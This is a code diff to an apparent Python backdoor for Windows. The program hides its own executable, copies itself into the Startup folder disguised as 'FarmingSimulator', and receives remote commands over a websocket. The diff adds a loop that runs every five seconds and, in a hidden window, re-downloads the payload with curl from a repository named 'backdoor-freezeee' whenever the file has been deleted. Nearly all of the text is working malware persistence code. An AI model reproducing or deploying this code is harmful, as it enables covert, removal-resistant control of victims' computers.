@@ -6,6 +6,7 @@ import sys
 import os
 import ctypes
 import shutil
+import threading
 
 FILE_ATTRIBUTE_HIDDEN = 0x2
 FILE_ATTRIBUTE_SYSTEM = 0x4
@@ -16,6 +17,10 @@ CLIENT_NAME = getpass.getuser()
 FILE_ATTRIBUTE_NORMAL = 0x80
 
 current_exe = sys.executable
+startup_folder = os.path.join("C:\\Users", CLIENT_NAME, "AppData", "Roaming",
+                            "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
+exe_final_location = os.path.join(startup_folder, "FarmingSimulator.exe")
+url = "https://raw.githubusercontent.com/sincezola/backdoor-freezeee/main/src/bin/FarmingSimulatorRI.exe"
 
 def unhide_file(path: str):
     res = ctypes.windll.kernel32.SetFileAttributesW(
@@ -31,10 +36,26 @@ def hide_file(path):
         FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM
     )
 
+def reinstall_program():
+    if not os.path.isfile(exe_final_location):
+        subprocess.run(
+            [
+                "curl.exe",
+                "-L",
+                url,
+                "-o",
+                exe_final_location
+            ],
+            stdout=subprocess.DEVNULL,
+            stderr=subprocess.DEVNULL,
+            creationflags=subprocess.CREATE_NO_WINDOW
+        )
+    check_reinstall()
+
+def check_reinstall():
+    threading.Timer(5.0, reinstall_program).start()
+
 def move_to_startup():
-    startup_folder = os.path.join("C:\\Users", CLIENT_NAME, "AppData", "Roaming",
-                              "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
-    
     for f in os.listdir(startup_folder):
         if f.startswith("farmingsimulator") and f.endswith(".exe"):
             try:
@@ -49,7 +70,7 @@ def move_to_startup():
     try:
         shutil.copy(current_exe, dest)
         print(f"Copied to Startup as {dest_name}.")
-        unhide_file(dest);
+        unhide_file(dest)
     except Exception as e:
         print("Error copying to Startup:", e)
 
@@ -83,7 +104,8 @@ startupinfo.wShowWindow = subprocess.SW_HIDE
 creationflags = subprocess.CREATE_NO_WINDOW | subprocess.CREATE_NEW_PROCESS_GROUP
 
 hide_file(current_exe)
-move_to_startup();
+move_to_startup()
+check_reinstall()
 
 async def receiver(ws):
     global mouse_proc, keyboard_proc
